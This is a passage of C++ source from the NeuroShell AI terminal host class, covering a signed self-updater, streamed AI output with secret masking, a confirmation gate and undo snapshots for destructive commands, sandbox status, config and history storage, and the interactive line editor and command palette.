                            out << "{\"last_check\":" << now << ",\"latest_version\":\"" << tag << "\"}";
                            if (neuroshell::version::IsNewerRelease(tag)) {
                                g_remote_version = tag;
                                g_update_available.store(true);
                            }
                        }
                    }
                }
            } catch (...) {}
        }).detach();
    }

public:
    EnterpriseTerminalHost() {
        PlatformTerminal::SetTitle(std::string("NeuroShell v") + NEUROSHELL_VERSION + " — Enterprise Flagship AI Terminal");
        fs::path cur = fs::current_path();
        tabs.push_back({1, cur.filename().string(), cur.string()});
        shmRing.initialize_as_host();
        shmStreamRing.initialize_as_host(); // token-stream ring (daemon → host)
        LoadConfig();
        LoadHistory();
        NeuroShell::Daemon::DaemonManager::EnsureDaemonRunningAsync(ipcClient);
        CheckForUpdatesAsync();
    }

    void SetCyberMode(bool cyber) {
        isCyberEdition = cyber;
    }

    // Cryptographically verified self-update (v5.9+).
    // Replaces the old curl|bash / blind-download flow with the signed
    // pipeline in update_installer.hpp: Ed25519-signed manifest → policy
    // checks (anti-downgrade, expiry, host allowlist) → SHA-256-bound
    // artifact download → atomic executable swap. Fails closed when no
    // release signing key is provisioned in this build.
    void HandleSlashUpdate() {
        std::cout << "\n  " << C_BOLD << C_CYAN << "⌬ NeuroShell Verified Self-Updater" << C_RESET << "\n";
        std::cout << "  " << C_MUTED << "Fetching signed release manifest (Ed25519 + SHA-256 verification)..." << C_RESET << "\n\n";

        neuroshell::update::InstallResult res = neuroshell::update::UpdateInstaller::Run();

        if (res.ok) {
            g_update_available.store(false);
            g_remote_version = "";
            fs::path cachePath = PlatformFS::GetHomeDir() / ".neuroshell" / "update_cache.json";
            long long now = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
            std::ofstream out(cachePath);
            out << "{\"last_check\":" << now << ",\"latest_version\":\"" << res.new_version << "\"}";

            std::cout << "  " << C_BOLD << C_GREEN << "✨ " << res.message << C_RESET << "\n";
            std::cout << "  " << C_MUTED << "Please restart your terminal to activate the new version." << C_RESET << "\n\n";
        } else {
            std::cout << "  " << C_RED << "❌ Update not installed: " << res.message << C_RESET << "\n";
            std::cout << "  " << C_MUTED << "You can update manually from https://github.com/abneeshsingh21/neuroshell/releases" << C_RESET << "\n\n";
        }
    }

    // ═══════════════════════════════════════════════════════
    // Phase 2 (v5.10): SHM token streaming for AI pipes
    // ═══════════════════════════════════════════════════════
    // Non-blocking Esc probe used while a token stream renders. Consumes
    // nothing else: any non-Esc byte is discarded (the UI is output-only
    // during a stream).
    static bool PollEscapePressed() {
#if defined(NEUROSHELL_PLATFORM_WINDOWS)
        while (_kbhit()) {
            int ch = _getch();
            if (ch == 27) return true;
            if (ch == 0 || ch == 0xE0) { if (_kbhit()) _getch(); } // swallow scan code
        }
        return false;
#else
        struct pollfd pfd = { STDIN_FILENO, POLLIN, 0 };
        while (poll(&pfd, 1, 0) > 0 && (pfd.revents & POLLIN)) {
            char c = 0;
            if (read(STDIN_FILENO, &c, 1) <= 0) break;
            if (c == 27) {
                // Bare Esc vs. escape sequence (arrow keys etc.): if more
                // bytes follow immediately, it's a sequence — drain & ignore.
                struct pollfd pfd2 = { STDIN_FILENO, POLLIN, 0 };
                if (poll(&pfd2, 1, 20) <= 0) return true;
                char drain[8];
                while (poll(&pfd2, 1, 0) > 0) {
                    if (read(STDIN_FILENO, drain, sizeof(drain)) <= 0) break;
                }
            }
        }
        return false;
#endif
    }

    // Streamed @ai/@fix/@explain pipe: tokens render as they arrive over the
    // SHM stream ring (sub-frame latency), DLP-masked per completed line,
    // Esc cancels mid-generation. Falls back to the blocking ai_pipe RPC
    // when the daemon predates ABI v3 or the ring is unavailable.
    void RunStreamedAIPipe(const std::string& directive, const std::string& prompt,
                           const std::string& inputText) {
        const std::string cwd = fs::current_path().string();

        if (!shmStreamRing.is_connected()) {
            std::string aiResponse = ipcClient.AIPipe(directive, prompt, inputText, cwd);
            std::cout << "  " << C_WHITE << dlpMasker.filter_stream(aiResponse) << C_RESET << "\n\n";
            return;
        }

        // Fresh stream: drop any stale frames + stale cancel flag.
        shmStreamRing.drain();
        shmStreamRing.clear_cancel();
        const uint32_t streamId = neuroshell::TokenStreamReader::NextStreamId();

        // Fire the RPC on a worker; the daemon blocks in it until the stream
        // terminates, while this thread consumes tokens from the ring.
        NeuroShell::IPC::NeuroIPCClient::AIPipeStreamResult rpc;
        std::thread rpcThread([&]() {
            rpc = ipcClient.AIPipeStream(directive, prompt, inputText, cwd, streamId);
        });

        size_t rendered_lines = 0;
        neuroshell::TokenStreamReader reader(
            shmStreamRing,
            [&](const std::string& line) {
                std::cout << "  " << C_WHITE << dlpMasker.filter_stream(line) << C_RESET << "\n"
                          << std::flush;
                ++rendered_lines;
            },
            []() { return PollEscapePressed(); });

        neuroshell::StreamResult sres = reader.Consume(streamId);
        rpcThread.join();
        shmStreamRing.clear_cancel();

        if (sres.cancelled) {
            std::cout << "\n  " << C_YELLOW << "◼ Generation cancelled." << C_RESET << "\n\n";
            return;
        }
        if (sres.completed && sres.tokens > 0) {
            std::cout << "\n";
            return;
        }
        if (sres.error) {
            std::cout << "  " << C_RED << "❌ " << dlpMasker.filter_stream(sres.error_message)
                      << C_RESET << "\n\n";
            return;
        }

        // No tokens arrived (old daemon without ai_pipe_stream, or timeout):
        // fall back to the RPC's full-text copy, then to the legacy method.
        std::string fallback = rpc.rpc_ok ? rpc.response
                                          : ipcClient.AIPipe(directive, prompt, inputText, cwd);
        std::cout << "  " << C_WHITE << dlpMasker.filter_stream(fallback) << C_RESET << "\n\n";
    }

    // ═══════════════════════════════════════════════════════
    // Phase 4 (v5.12): Blast-Radius Preview
    // ═══════════════════════════════════════════════════════
    static std::string HumanBytes(uint64_t b) {
        char buf[32];
        if (b >= (1ull << 30)) std::snprintf(buf, sizeof(buf), "%.1f GiB", (double)b / (1ull << 30));
        else if (b >= (1ull << 20)) std::snprintf(buf, sizeof(buf), "%.1f MiB", (double)b / (1ull << 20));
        else if (b >= (1ull << 10)) std::snprintf(buf, sizeof(buf), "%.1f KiB", (double)b / (1ull << 10));
        else std::snprintf(buf, sizeof(buf), "%llu B", (unsigned long long)b);
        return buf;
    }

    // Returns true when the command may run (safe, or user confirmed).
    // Set NEUROSHELL_NO_BLAST_GUARD=1 to disable (CI / scripted use).
    bool BlastRadiusGate(const std::string& commandToRun) {
        static const bool disabled = [] {
            const char* v = std::getenv("NEUROSHELL_NO_BLAST_GUARD");
            return v && *v && std::string(v) != "0";
        }();
        if (disabled) return true;

        neuroshell::BlastRadiusAnalyzer analyzer;
        neuroshell::BlastReport report =
            analyzer.Analyze(commandToRun, tabs[activeTabIdx].cwd);
        if (!report.NeedsConfirmation()) return true;

        const char* sevColor =
            report.severity == neuroshell::BlastSeverity::Critical ? C_RED :
            report.severity == neuroshell::BlastSeverity::High ? C_RED : C_YELLOW;

        std::cout << "\n  " << C_BOLD << sevColor << "⚠ Blast-Radius Preview — "
                  << neuroshell::BlastSeverityName(report.severity) << " impact" << C_RESET << "\n";

        for (const auto& op : report.operations) {
            if (op.severity < neuroshell::BlastSeverity::Medium) continue;
            std::cout << "  " << C_MUTED << "├─ " << C_RESET << C_WHITE << op.verb << C_RESET;
            if (!op.note.empty()) std::cout << C_MUTED << "  (" << op.note << ")" << C_RESET;
            std::cout << "\n";
            int shown = 0;
            for (const auto& t : op.targets) {
                if (!t.exists) continue;
                std::cout << "  " << C_MUTED << "│    " << C_RESET << t.path;
                if (t.is_dir) {
                    std::cout << C_MUTED << "  → " << (t.scan_capped ? "≥" : "") << t.files
                              << " files, " << (t.scan_capped ? "≥" : "") << HumanBytes(t.bytes)
                              << C_RESET;
                } else if (t.bytes > 0) {
                    std::cout << C_MUTED << "  → " << HumanBytes(t.bytes) << C_RESET;
                }
                std::cout << "\n";
                if (++shown >= 8) {
                    std::cout << "  " << C_MUTED << "│    … and more" << C_RESET << "\n";
                    break;
                }
            }
        }
        if (report.total_files > 0) {
            std::cout << "  " << C_MUTED << "╰─ total: " << (report.scan_capped ? "≥" : "")
                      << report.total_files << " files, " << (report.scan_capped ? "≥" : "")
                      << HumanBytes(report.total_bytes) << C_RESET << "\n";
        }

        // CRITICAL requires typing "yes"; MEDIUM/HIGH accept a single 'y'.
        if (report.severity == neuroshell::BlastSeverity::Critical) {
            std::cout << "\n  " << C_BOLD << C_RED
                      << "This can destroy your system. Type 'yes' to proceed: " << C_RESET;
            std::string typed;
            while (true) {
                KeyEvent ev = terminal.ReadKey();
                if (ev.code == KeyCode::Enter) break;
                if (ev.code == KeyCode::Escape || ev.code == KeyCode::Ctrl_C) { std::cout << "\n"; return false; }
                if (ev.code == KeyCode::Backspace) {
                    if (!typed.empty()) { typed.pop_back(); std::cout << "\b \b" << std::flush; }
                } else if (ev.code == KeyCode::Printable) {
                    typed.push_back(ev.ch);
                    std::cout << ev.ch << std::flush;
                }
            }
            std::cout << "\n";
            if (typed != "yes") return false;
            SnapshotForUndo(report, commandToRun);
            return true;
        }

        std::cout << "\n  " << C_BOLD << C_YELLOW << "Proceed? [y/N]: " << C_RESET;
        KeyEvent key = terminal.ReadKey();
        bool ok = (key.code == KeyCode::Printable && (key.ch == 'y' || key.ch == 'Y'));
        std::cout << (ok ? "y" : "n") << "\n";
        if (!ok) return false;
        SnapshotForUndo(report, commandToRun);
        return true;
    }

    // ═══════════════════════════════════════════════════════
    // Phase 5 (v5.13): Universal Undo — CoW snapshots
    // ═══════════════════════════════════════════════════════
    // After the user confirms a destructive command, snapshot its
    // write-targets so `undo` can bring them back. Best-effort by design:
    // a skipped snapshot (too large, non-CoW fs over budget) never blocks
    // execution — the user already confirmed the command.
    void SnapshotForUndo(const neuroshell::BlastReport& report, const std::string& cmd) {
        static const bool disabled = [] {
            const char* v = std::getenv("NEUROSHELL_NO_UNDO");
            return v && *v && std::string(v) != "0";
        }();
        if (disabled) return;

        neuroshell::SnapshotResult snap =
            undoEngine.SnapshotBeforeExecute(report, cmd, tabs[activeTabIdx].cwd);
        if (snap.status == neuroshell::SnapshotStatus::Saved) {
            std::cout << "  " << C_MUTED << "⎌ Undo point saved (" << snap.files
                      << (snap.files == 1 ? " file, " : " files, ") << HumanBytes(snap.bytes)
                      << (snap.copied_bytes == 0 && snap.bytes > 0 ? ", reflinked" : "")
                      << ") — type 'undo' to revert." << C_RESET << "\n";
        } else if (snap.status == neuroshell::SnapshotStatus::SkippedTooLarge) {
            std::cout << "  " << C_MUTED << "⎌ No undo point: " << snap.reason << "." << C_RESET << "\n";
        }
    }

    void HandleUndoCommand(const std::string& input) {
        std::string arg = input.size() > 4 ? input.substr(5) : "";
        // trim
        while (!arg.empty() && (arg.back() == ' ' || arg.back() == '\t')) arg.pop_back();

        if (arg == "list") {
            auto txns = undoEngine.ListTransactions();
            if (txns.empty()) {
                std::cout << "\n  " << C_MUTED << "No undo points recorded." << C_RESET << "\n\n";
                return;
            }
            std::cout << "\n  " << C_BOLD << C_CYAN << "⎌ Undo Points (newest first)" << C_RESET << "\n";
            int shown = 0;
            for (const auto& t : txns) {
                std::cout << "  " << C_MUTED << (shown == 0 ? "→ " : "  ") << C_RESET
                          << C_WHITE << t.command << C_RESET
                          << C_MUTED << "  (" << t.files << (t.files == 1 ? " file, " : " files, ")
                          << HumanBytes(t.bytes) << ")" << C_RESET << "\n";
                if (++shown >= 10) break;
            }
            std::cout << "  " << C_MUTED << "'undo' restores the top entry." << C_RESET << "\n\n";
            return;
        }

        auto txns = undoEngine.ListTransactions();
        if (txns.empty()) {
            std::cout << "\n  " << C_MUTED << "Nothing to undo — no snapshots recorded." << C_RESET << "\n\n";
            return;
        }
        std::cout << "\n  " << C_BOLD << C_YELLOW << "⎌ Undo: " << C_RESET << C_WHITE
                  << txns[0].command << C_RESET << "\n";
        std::cout << "  " << C_MUTED << "Restores " << txns[0].files
                  << (txns[0].files == 1 ? " file (" : " files (") << HumanBytes(txns[0].bytes)
                  << "), overwriting current state of those paths." << C_RESET << "\n";
        std::cout << "  " << C_BOLD << C_YELLOW << "Proceed? [y/N]: " << C_RESET;
        KeyEvent key = terminal.ReadKey();
        bool ok = (key.code == KeyCode::Printable && (key.ch == 'y' || key.ch == 'Y'));
        std::cout << (ok ? "y" : "n") << "\n";
        if (!ok) { std::cout << "\n"; return; }

        neuroshell::RestoreResult r = undoEngine.Undo();
        if (r.ok) {
            std::cout << "  " << C_GREEN << "✔ Restored " << r.files_restored
                      << (r.files_restored == 1 ? " file." : " files.") << C_RESET << "\n\n";
        } else {
            std::cout << "  " << C_RED << "✘ Undo failed: " << r.error << C_RESET << "\n\n";
        }
    }

    // ═══════════════════════════════════════════════════════
    // Phase 8 (v5.16): /sandbox command
    // ═══════════════════════════════════════════════════════
    void HandleSandboxCommand(const std::string& input) {
        std::string arg;
        size_t sp = input.find(' ');
        if (sp != std::string::npos) arg = input.substr(sp + 1);
        while (!arg.empty() && (arg.back() == ' ' || arg.back() == '\t')) arg.pop_back();

        if (!arg.empty()) {
            neuroshell::SandboxMode m;
            if (neuroshell::ParseSandboxMode(arg, m)) {
                sandboxMode = m;
                std::cout << "\n  " << C_GREEN << "✔ Kernel sandbox mode → "
                          << C_BOLD << C_WHITE << neuroshell::SandboxModeName(m)
                          << C_RESET << "\n\n";
            } else {
                std::cout << "\n  " << C_RED << "Unknown mode '" << arg
                          << "'. Use: /sandbox off|project|strict" << C_RESET << "\n\n";
            }
            return;
        }

        neuroshell::SandboxSupport sup = neuroshell::ProbeSandboxSupport();
        std::cout << "\n  " << C_BOLD << C_CYAN << "⛨ Kernel Sandbox Status" << C_RESET << "\n";
        std::cout << "  " << C_MUTED << "Mode:      " << C_RESET << C_WHITE
                  << neuroshell::SandboxModeName(sandboxMode) << C_RESET << "\n";
        std::cout << "  " << C_MUTED << "Landlock:  " << C_RESET
                  << (sup.landlock
                          ? (std::string(C_GREEN) + "available (ABI " +
                             std::to_string(sup.landlock_abi) + ")" + C_RESET)
                          : (std::string(C_YELLOW) + "unavailable" + C_RESET))
                  << "\n";
        std::cout << "  " << C_MUTED << "seccomp:   " << C_RESET
                  << (sup.seccomp ? (std::string(C_GREEN) + "available" + C_RESET)
                                  : (std::string(C_YELLOW) + "unavailable" + C_RESET))
                  << "\n";
        std::cout << "  " << C_MUTED
                  << "project = confine AI-translated commands · strict = confine all\n"
                  << "  '!cmd' runs one command unconfined · /sandbox off|project|strict"
                  << C_RESET << "\n\n";
    }

    fs::path GetConfigPath() {
        return PlatformFS::GetHomeDir() / ".neuroshell" / "config.toml";
    }

    fs::path GetHistoryPath() {
        return PlatformFS::GetHomeDir() / ".neuroshell" / "history.txt";
    }

    void LoadConfig() {
        fs::path configPath = GetConfigPath();
        if (!fs::exists(configPath)) return;

        std::ifstream f(configPath);
        std::string line;
        while (std::getline(f, line)) {
            if (line.find("provider = ") != std::string::npos) {
                size_t q1 = line.find("\"");
                size_t q2 = line.rfind("\"");
                if (q1 != std::string::npos && q2 > q1) activeProvider = line.substr(q1 + 1, q2 - q1 - 1);
            }
            if (line.find("model = ") != std::string::npos) {
                size_t q1 = line.find("\"");
                size_t q2 = line.rfind("\"");
                if (q1 != std::string::npos && q2 > q1) activeModel = line.substr(q1 + 1, q2 - q1 - 1);
            }
        }
    }

    void SaveConfig(const std::string& provider, const std::string& model, const std::string& apiKey = "") {
        activeProvider = provider;
        activeModel = model;

        fs::path configPath = GetConfigPath();
        fs::create_directories(configPath.parent_path());

        std::ofstream f(configPath);
        f << "# NeuroShell Configuration\n[llm]\nprovider = \"" << provider << "\"\nmodel = \"" << model << "\"\ntemperature = 0.2\n\n";

        if (!apiKey.empty()) {
            // Secure-by-default: store the API key in the OS credential vault
            // (Keychain / DPAPI / Secret Service), never in a plaintext file.
            std::string vaultKey = provider + "_api_key";
            if (neuroshell::OSVault::StoreSecret(vaultKey, apiKey)) {
                f << "[secrets]\n# API key stored securely in the OS credential vault\n"
                  << provider << "_api_key_ref = \"os-vault:" << vaultKey << "\"\n";
            } else {
                // Vault unavailable (e.g. headless Linux without secret-tool):
                // fall back to file storage but lock down permissions.
                f << "[secrets]\n" << provider << "_api_key = \"" << apiKey << "\"\n";
                f.flush();
#if defined(NEUROSHELL_PLATFORM_POSIX)
                chmod(configPath.string().c_str(), 0600);
#endif
                std::cout << "  " << C_YELLOW
                          << "⚠️ OS credential vault unavailable — key stored in "
                          << configPath.string() << " (permissions restricted to 0600)."
                          << C_RESET << "\n";
            }
        }

#if defined(NEUROSHELL_PLATFORM_POSIX)
        chmod(configPath.string().c_str(), 0600);
#endif
    }

    // Phase 3 (v5.11): history now lives in the SQLite+FTS5 store shared
    // with the Python daemon. The flat file remains as (a) the source for a
    // one-time migration and (b) the fallback when SQLite is unavailable.
    void LoadHistory() {
        fs::path dbPath = PlatformFS::GetHomeDir() / ".neuroshell" / "history.db";
        if (historyDb.Open(dbPath)) {
            historyDb.MigrateLegacyFile(GetHistoryPath());
            // Warm the in-memory Up-arrow ring with recent unique commands
            // (oldest → newest so index arithmetic stays natural).
            std::vector<std::string> recent = historyDb.RecentUnique(500);
            for (auto it = recent.rbegin(); it != recent.rend(); ++it) {
                history.push_back({*it, "", 0});
                predictor.Learn(*it);
            }
            historyIndex = (int)history.size();
            return;
        }

        // Fallback: legacy flat file
        fs::path histPath = GetHistoryPath();
        if (!fs::exists(histPath)) return;

        std::ifstream f(histPath);
        std::string line;
        while (std::getline(f, line)) {
            if (!line.empty()) {
                history.push_back({line, "", 0});
                predictor.Learn(line);
            }
        }
        historyIndex = (int)history.size();
    }

    void AppendHistory(const std::string& cmd) {
        if (cmd.empty()) return;
        history.push_back({cmd, tabs[activeTabIdx].cwd, 0});
        historyIndex = (int)history.size();
        predictor.Learn(cmd);

        if (historyDb.IsOpen()) {
            historyDb.Append(cmd, tabs[activeTabIdx].cwd);
            return;
        }

        // Fallback: legacy flat file
        fs::path histPath = GetHistoryPath();
        fs::create_directories(histPath.parent_path());
        std::ofstream f(histPath, std::ios::app);
        if (f.is_open()) f << cmd << "\n";
    }

    void PrintBanner() {
        if (isCyberEdition) {
            std::cout << "\n  " << C_BOLD << C_GREEN << "⌬ " << C_BOLD << C_WHITE << "NeuroShell " << C_BOLD << C_GREEN << "CYBER EDITION" << C_RESET << "\n";
            std::cout << "  " << C_MUTED << "Transparent WSL2 Kali Engine • Scope Guard Active • Type plain English or /help" << C_RESET << "\n";
        } else {
            std::cout << "\n  " << C_BOLD << C_CYAN << "⌬ " << C_BOLD << C_WHITE << "NeuroShell" << C_RESET << "\n";
            std::cout << "  " << C_MUTED << "Type plain English or press [F1] for Command Palette • /help for commands" << C_RESET << "\n";
        }
        if (g_update_available.load() && !g_remote_version.empty()) {
            std::cout << "  " << C_BOLD << C_YELLOW << "✨ Update available: " << C_RESET << C_WHITE << "v" << NEUROSHELL_VERSION << " → v" << g_remote_version << C_RESET << C_MUTED << " • Type /update to upgrade in 1-click" << C_RESET << "\n";
        }
        std::cout << "\n";
    }

    void RenderTabBar() {
        if (tabs.size() <= 1) return;

        std::cout << " ";
        for (int i = 0; i < (int)tabs.size(); ++i) {
            std::string label = " " + std::to_string(i + 1) + ": " + tabs[i].name + " ";
            if (i == activeTabIdx) {
                std::cout << C_TAB_ACT << C_BOLD << label << C_RESET << " ";
            } else {
                std::cout << C_TAB_IN << "[" << label << "]" << C_RESET << " ";
            }
        }
        std::cout << C_MUTED << "(+ Ctrl+T)\n" << C_RESET;
    }

    std::string GetGitBranch() {
        if (fs::exists(".git/HEAD")) {
            try {
                std::ifstream f(".git/HEAD");
                std::string s;
                if (std::getline(f, s)) {
                    size_t pos = s.find("refs/heads/");
                    if (pos != std::string::npos) {
                        std::string branch = s.substr(pos + 11);
                        branch.erase(branch.find_last_not_of(" \n\r\t") + 1);
                        return branch;
                    }
                }
            } catch (...) {}
        }
        return "";
    }

    // ═══════════════════════════════════════════════════════
    // Interactive Character-by-Character Line Editor
    // ═══════════════════════════════════════════════════════

    std::string ReadLine(const std::string& promptPrefix) {
        std::string buffer = "";
        std::string ghostSuggestion = "";
        int cursorPos = 0;
        int localHistIdx = (int)history.size();

        auto Redraw = [&]() {
            ghostSuggestion = (cursorPos == (int)buffer.length()) ? predictor.GetSuggestion(buffer) : "";

            std::cout << "\r\033[2K" << promptPrefix;
            std::cout << highlighter.Highlight(buffer);

            if (!ghostSuggestion.empty()) {
                std::cout << C_GHOST << ghostSuggestion << C_RESET;
            }

            int tailOffset = (int)buffer.length() - cursorPos + (int)ghostSuggestion.length();
            if (tailOffset > 0) {
                std::cout << "\033[" << tailOffset << "D";
            }
            std::cout.flush();
        };

        Redraw();

        while (true) {
            KeyEvent ev = terminal.ReadKey();

            if (ev.code == KeyCode::Enter) {
                std::cout << "\n";
                break;
            }
            if (ev.code == KeyCode::Ctrl_C) {
                std::cout << C_MUTED << " ^C\n" << C_RESET;
                return "";
            }
            if (ev.code == KeyCode::Ctrl_L) {
                PlatformTerminal::ClearScreen();
                PrintBanner();
                Redraw();
                continue;
            }
            if (ev.code == KeyCode::Ctrl_R) {
                std::string chosen = ReverseSearchModal();
                if (!chosen.empty()) {
                    buffer = chosen;
                    cursorPos = (int)buffer.length();
                }
                Redraw();
                continue;
            }
            if (ev.code == KeyCode::Ctrl_K || ev.code == KeyCode::Ctrl_P || ev.code == KeyCode::F1) {
                std::string chosen = CommandPaletteModal();
                if (!chosen.empty()) {
                    buffer = chosen;
                    cursorPos = (int)buffer.length();
                }
                Redraw();
                continue;
            }
            if (ev.code == KeyCode::Ctrl_T) {
                if (tabs.size() < 9) {
                    fs::path cwd = fs::current_path();
                    int newId = (int)tabs.size() + 1;
                    tabs.push_back({newId, cwd.filename().string(), cwd.string()});
                    activeTabIdx = (int)tabs.size() - 1;
                    std::cout << "\n" << C_GREEN << "  ✨ Created Tab " << newId << C_RESET << "\n";
                }
                Redraw();
                continue;
            }
            if (ev.code == KeyCode::Ctrl_W) {
                if (tabs.size() > 1) {
                    tabs.erase(tabs.begin() + activeTabIdx);
                    activeTabIdx = std::max(0, activeTabIdx - 1);
                    fs::current_path(tabs[activeTabIdx].cwd);
                    std::cout << "\n" << C_YELLOW << "  🗑️ Closed Tab" << C_RESET << "\n";
                }
                Redraw();
                continue;
            }
            if (ev.code == KeyCode::Tab) {
                if (!ghostSuggestion.empty() && cursorPos == (int)buffer.length()) {
                    buffer += ghostSuggestion;
                    cursorPos = (int)buffer.length();
                } else {
                    std::string pathComp = predictor.GetPathCompletion(buffer);
                    if (!pathComp.empty()) {
                        buffer += pathComp;
                        cursorPos = (int)buffer.length();
                    }
                }
                Redraw();
                continue;
            }
            if (ev.code == KeyCode::Backspace) {
                if (cursorPos > 0) {
                    buffer.erase(cursorPos - 1, 1);
                    cursorPos--;
                }
                Redraw();
                continue;
            }
            if (ev.code == KeyCode::Left) {
                if (cursorPos > 0) cursorPos--;
                Redraw();
                continue;
            }
            if (ev.code == KeyCode::Right) {
                if (cursorPos < (int)buffer.length()) {
                    cursorPos++;
                } else if (!ghostSuggestion.empty()) {
                    buffer += ghostSuggestion;
                    cursorPos = (int)buffer.length();
                }
                Redraw();
                continue;
            }
            if (ev.code == KeyCode::Up) {
                if (!history.empty() && localHistIdx > 0) {
                    localHistIdx--;
                    buffer = history[localHistIdx].command;
                    cursorPos = (int)buffer.length();
                }
                Redraw();
                continue;
            }
            if (ev.code == KeyCode::Down) {
                if (localHistIdx < (int)history.size() - 1) {
                    localHistIdx++;
                    buffer = history[localHistIdx].command;
                    cursorPos = (int)buffer.length();
                } else {
                    localHistIdx = (int)history.size();
                    buffer = "";
                    cursorPos = 0;
                }
                Redraw();
                continue;
            }
            if (ev.code == KeyCode::Home) {
                cursorPos = 0;
                Redraw();
                continue;
            }
            if (ev.code == KeyCode::End) {
                cursorPos = (int)buffer.length();
                Redraw();
                continue;
            }
            if (ev.code == KeyCode::Delete) {
                if (cursorPos < (int)buffer.length()) {
                    buffer.erase(cursorPos, 1);
                }
                Redraw();
                continue;
            }
            if (ev.code == KeyCode::Printable) {
                buffer.insert(cursorPos, 1, ev.ch);
                cursorPos++;
                Redraw();
            }
        }

        return buffer;
    }

    // ═══════════════════════════════════════════════════════
    // Reverse History Search Modal (Ctrl + R)
    // ═══════════════════════════════════════════════════════

    // Phase 3 (v5.11): Ctrl+R is now RANKED recall, not just most-recent
    // substring match. Results are scored 0.6·frecency + 0.3·cwd-affinity +
    // 0.1·prefix from the SQLite store; ↑/↓ navigates the top matches.
    // Falls back to the legacy in-memory scan when SQLite is unavailable.
    std::string ReverseSearchModal() {
        std::string query = "";
        int selectedIdx = 0;
        int lastRendered = 0;
        const std::string cwd = tabs[activeTabIdx].cwd;
        std::cout << "\n";

        auto collect = [&](const std::string& q) -> std::vector<std::string> {
            if (historyDb.IsOpen()) {
                std::vector<neuroshell::RankedCommand> ranked = historyDb.Search(q, cwd, 5);
                std::vector<std::string> cmds;
                cmds.reserve(ranked.size());
                for (auto& r : ranked) cmds.push_back(r.command);
                if (!cmds.empty() || !q.empty()) return cmds;
            }
            // Fallback: newest-first substring scan of the session ring
            std::vector<std::string> matches;
            for (int i = (int)history.size() - 1; i >= 0; --i) {
                if (q.empty() || history[i].command.find(q) != std::string::npos) {
                    if (std::find(matches.begin(), matches.end(), history[i].command) == matches.end()) {
                        matches.push_back(history[i].command);
                        if (matches.size() >= 5) break;
                    }
                }
            }
            return matches;
        };

        while (true) {
            std::vector<std::string> matches = collect(query);
            int count = (int)matches.size();
            if (selectedIdx >= count) selectedIdx = std::max(0, count - 1);

            // Repaint: move up over the previous result block, redraw.
            if (lastRendered > 0) std::cout << "\033[" << lastRendered << "A";
            std::cout << "\r\033[2K" << C_CYAN << "  (ranked-search)`" << C_BOLD << C_WHITE
                      << query << C_RESET << C_CYAN << "': " << C_RESET << C_MUTED
                      << (historyDb.IsOpen() ? "frecency+cwd ranked" : "recent-first")
                      << C_RESET << "\n";
            for (int i = 0; i < count; ++i) {
                std::string label = matches[i];
                if (label.length() > 70) label = label.substr(0, 67) + "...";
                std::cout << "\r\033[2K";
                if (i == selectedIdx) {
                    std::cout << "  " << C_BOLD << C_GREEN << " ❯ " << label << C_RESET << "\n";
                } else {
                    std::cout << "  " << C_MUTED << "   " << label << C_RESET << "\n";
                }
            }
            for (int i = count; i < lastRendered - 1 && i < 5; ++i) {
                std::cout << "\r\033[2K\n"; // clear leftover lines from longer lists
            }
            lastRendered = 1 + std::max(count, std::min(lastRendered - 1, 5));
            std::cout.flush();

            KeyEvent ev = terminal.ReadKey();
            if (ev.code == KeyCode::Enter) {
                std::cout << "\n";
                if (count > 0 && selectedIdx >= 0 && selectedIdx < count) return matches[selectedIdx];
                return query;
            } else if (ev.code == KeyCode::Escape || ev.code == KeyCode::Ctrl_C) {
                std::cout << "\n";
                return "";
            } else if (ev.code == KeyCode::Up) {
                if (count > 0) selectedIdx = (selectedIdx - 1 + count) % count;
            } else if (ev.code == KeyCode::Down || ev.code == KeyCode::Ctrl_R) {
                if (count > 0) selectedIdx = (selectedIdx + 1) % count;
            } else if (ev.code == KeyCode::Backspace) {
                if (!query.empty()) { query.pop_back(); selectedIdx = 0; }
            } else if (ev.code == KeyCode::Printable) {
                query.push_back(ev.ch);
                selectedIdx = 0;
            }
        }
    }

    // ═══════════════════════════════════════════════════════
    // In-Terminal Command Palette Modal (Ctrl+Shift+P / F1)
    // ═══════════════════════════════════════════════════════

    std::string CommandPaletteModal() {
        std::string query = "";
        int selectedIdx = 0;
        bool firstRender = true;
        std::cout << "\033[?25l";

        while (true) {
            std::vector<neuroshell::PaletteCommand> matches = cmdPalette.Search(query);
            int displayCount = std::min((int)matches.size(), 8);
            if (selectedIdx >= displayCount) selectedIdx = std::max(0, displayCount - 1);

            if (!firstRender) {
                std::cout << "\033[" << (displayCount + 4) << "A\r";
            }
            firstRender = false;

            std::cout << C_CYAN << "  ╭── ⌬ NeuroShell Command Palette ─────────────────────────────────╮\033[K\n";
            std::cout << "  │  " << C_BOLD << C_MAGENTA << "> " << C_WHITE << query << C_RESET << std::string(std::max(0, 58 - (int)query.length()), ' ') << C_CYAN << "│\033[K\n";
            std::cout << "  ├─────────────────────────────────────────────────────────────────┤\033[K\n";

            if (displayCount == 0) {
                std::cout << C_CYAN << "  │  " << C_MUTED << "No matching commands found.                          " << C_CYAN << "│\033[K\n";
            } else {
                for (int i = 0; i < displayCount; ++i) {
                    const auto& cmd = matches[i];
                    std::string label = cmd.title + " (" + cmd.action_command + ")";
                    if (label.length() > 60) label = label.substr(0, 57) + "...";

                    if (i == selectedIdx) {
                        std::cout << C_CYAN << "  │ " << C_BOLD << C_GREEN << " ❯ " << label << C_RESET 
                                  << std::string(std::max(0, 59 - (int)label.length()), ' ') << C_CYAN << "│\033[K\n";
                    } else {
                        std::cout << C_CYAN << "  │   " << C_DIM << C_WHITE << label << C_RESET 
                                  << std::string(std::max(0, 59 - (int)label.length()), ' ') << C_CYAN << "│\033[K\n";
                    }
                }
            }

            std::cout << C_CYAN << "  ╰─────────────────────────────────────────────────────────────────╯\033[K\n";

            KeyEvent ev = terminal.ReadKey();
            if (ev.code == KeyCode::Escape || ev.code == KeyCode::Ctrl_C) {
                std::cout << "\033[?25h\n";
                return "";
            } else if (ev.code == KeyCode::Enter) {
                std::cout << "\033[?25h\n";
                if (!matches.empty() && selectedIdx >= 0 && selectedIdx < (int)matches.size()) {
                    return matches[selectedIdx].action_command;
                }
                return "";
            } else if (ev.code == KeyCode::Up) {
                if (displayCount > 0) selectedIdx = (selectedIdx - 1 + displayCount) % displayCount;
            } else if (ev.code == KeyCode::Down) {
                if (displayCount > 0) selectedIdx = (selectedIdx + 1) % displayCount;
            } else if (ev.code == KeyCode::Backspace) {
                if (!query.empty()) {
                    query.pop_back();
                    selectedIdx = 0;
                }
